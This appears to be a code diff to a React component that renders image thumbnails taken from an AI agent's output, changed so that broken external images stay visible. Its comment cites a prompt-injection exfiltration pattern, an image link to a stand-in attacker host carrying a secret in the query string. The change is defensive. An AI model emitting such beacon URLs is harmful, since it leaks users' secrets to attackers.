@@ -64,8 +64,10 @@ export const ShownImagesContext = createContext<ShownImages | null>(null);
 
 const noSubscribe = () => () => {};
 
-/** Row of thumbnails. `agentProse`: refs scraped from an agent's text — hide dead
- *  ones, and skip any an image-job card in this thread is already showing. */
+/** Row of thumbnails. `agentProse`: refs scraped from an agent's text — hide our own
+ *  dead ones, and skip any an image-job card in this thread is already showing. An
+ *  external URL keeps its broken icon: hiding it would make an injected agent's
+ *  `https://evil/x.png?d=<secret>` beacon invisible. */
 export function ImageStrip({ urls, agentProse = false }: { urls: string[]; agentProse?: boolean }) {
   const shown = useContext(ShownImagesContext);
   const store = agentProse ? shown : null;
@@ -74,7 +76,7 @@ export function ImageStrip({ urls, agentProse = false }: { urls: string[]; agent
   if (visible.length === 0) return null;
   return (
     <div className="flex flex-wrap gap-2 mt-2">
-      {visible.map((url) => <InlineImage key={url} src={url} hideOnError={agentProse} />)}
+      {visible.map((url) => <InlineImage key={url} src={url} hideOnError={agentProse && url.startsWith("/api/")} />)}
     </div>
   );
 }
